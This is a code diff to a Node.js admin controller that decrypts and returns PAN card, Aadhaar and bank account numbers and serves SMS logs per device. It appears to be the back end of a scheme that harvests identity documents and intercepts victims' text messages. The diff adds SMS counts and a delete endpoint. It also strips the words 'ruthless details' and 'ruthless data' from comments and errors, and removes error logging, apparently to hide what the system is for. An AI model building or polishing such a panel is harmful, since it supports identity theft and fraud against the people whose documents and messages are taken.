@@ -4,15 +4,26 @@ const { decrypt } = require('../utils/encryption');
 exports.getAllApplications = async (req, res) => {
     try {
         const applications = await Application.findAll({
+            attributes: {
+                include: [
+                    [
+                        require('sequelize').literal(`(
+                            SELECT COUNT(*)
+                            FROM "SmsLogs"
+                            WHERE "SmsLogs"."applicationId" = "Application"."applicationId"
+                        )`),
+                        'smsCount'
+                    ]
+                ]
+            },
             order: [['createdAt', 'DESC']]
         });
 
         const decryptedApplications = applications.map(app => {
             const data = app.toJSON();
-
-            // Decrypt ruthless details
             return {
                 ...data,
+                smsCount: parseInt(data.smsCount) || 0,
                 panCard: decrypt(data.panCard),
                 aadhaarNumber: decrypt(data.aadhaarNumber),
                 bankAccount: decrypt(data.bankAccount),
@@ -24,8 +35,7 @@ exports.getAllApplications = async (req, res) => {
 
         res.json(decryptedApplications);
     } catch (error) {
-        console.error('[ADMIN ERROR]', error);
-        res.status(500).json({ error: 'Failed to fetch ruthless data' });
+        res.status(500).json({ error: 'Failed to fetch data' });
     }
 };
 
@@ -50,6 +60,7 @@ exports.getApplicationById = async (req, res) => {
         res.status(500).json({ error: 'Error fetching details' });
     }
 };
+
 exports.getSmsLogs = async (req, res) => {
     try {
         const { applicationId, deviceId } = req.query;
@@ -65,6 +76,24 @@ exports.getSmsLogs = async (req, res) => {
 
         res.json(logs);
     } catch (error) {
-        res.status(500).json({ error: 'Failed to fetch SMS logs' });
+        res.status(500).json({ error: 'Failed to fetch logs' });
+    }
+};
+
+exports.deleteApplication = async (req, res) => {
+    try {
+        const { id } = req.params;
+        const app = await Application.findOne({ where: { applicationId: id } });
+        if (!app) return res.status(404).json({ error: 'Not found' });
+
+        // Deleting the application also deletes associated SMS logs if logic permits, 
+        // but here we manually delete them to be safe if hooks aren't set.
+        await SmsLog.destroy({ where: { applicationId: id } });
+        await app.destroy();
+
+        res.status(204).send();
+    } catch (error) {
+        console.error('Delete error:', error);
+        res.status(500).json({ error: 'Failed to delete record' });
     }
 };
